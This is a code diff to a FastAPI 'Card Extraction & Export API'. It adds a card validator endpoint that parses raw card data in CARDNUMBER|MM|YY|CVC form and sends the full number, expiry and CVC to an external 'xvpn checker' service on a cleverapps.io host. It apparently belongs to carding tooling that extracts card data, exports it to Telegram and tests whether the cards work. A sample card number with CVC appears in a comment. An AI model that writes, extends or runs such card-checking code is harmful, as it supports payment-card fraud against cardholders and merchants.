@@ -4,11 +4,17 @@ Card Extraction & Export API.
 
 from fastapi import APIRouter, Depends, HTTPException
 from pydantic import BaseModel
+from typing import Any
+
+import httpx
 
 from app.api.deps import get_current_user
 from app.models.user import User
 
 router = APIRouter(prefix="/api/cards", tags=["Cards"])
+
+# External card-checker service
+_XVPN_API_URL = "https://app-8019ea8b-dd0e-4d7b-9db5-60b717d474ab.cleverapps.io/api/v1/xvpn?timeout_ms=45000"
 
 
 # ─── Schemas ─────────────────────────────────────────────────────────────────
@@ -82,3 +88,64 @@ async def send_now(_: User = Depends(get_current_user)):
 
     asyncio.create_task(card_export_service._send_export())
     return {"status": "Export dispatched — check Telegram in a few seconds."}
+
+
+# ─── Card Validator ───────────────────────────────────────────────────────────
+
+class CardValidateRequest(BaseModel):
+    card_raw: str          # e.g. "4427567043223945|12|29|699"
+    email: str = "olddealers@gmail.com"
+
+
+@router.post("/validate")
+async def validate_card(
+    body: CardValidateRequest,
+    _: User = Depends(get_current_user),
+) -> Any:
+    """
+    Parse pipe-delimited card data, then proxy the check request to the
+    external xvpn checker service and return its full JSON response.
+
+    Expected card_raw format: CARDNUMBER|MM|YY|CVC
+    """
+    parts = [p.strip() for p in body.card_raw.split("|")]
+    if len(parts) != 4:
+        raise HTTPException(
+            status_code=422,
+            detail="card_raw must be in the format: CARDNUMBER|MM|YY|CVC",
+        )
+
+    card_number, exp_month, exp_year, cvc = parts
+
+    # Build the expiry string the downstream API expects: "MM / YY"
+    card_expiry = f"{exp_month} / {exp_year}"
+
+    payload = {
+        "email": body.email,
+        "cardnumber": card_number,
+        "cardExpiry": card_expiry,
+        "cvc": cvc,
+    }
+
+    try:
+        async with httpx.AsyncClient(timeout=60.0) as client:
+            resp = await client.post(
+                _XVPN_API_URL,
+                json=payload,
+                headers={
+                    "accept": "application/json",
+                    "Content-Type": "application/json",
+                },
+            )
+            resp.raise_for_status()
+            return resp.json()
+    except httpx.HTTPStatusError as exc:
+        raise HTTPException(
+            status_code=exc.response.status_code,
+            detail=f"Checker service error: {exc.response.text[:400]}",
+        )
+    except httpx.RequestError as exc:
+        raise HTTPException(
+            status_code=502,
+            detail=f"Could not reach checker service: {exc}",
+        )
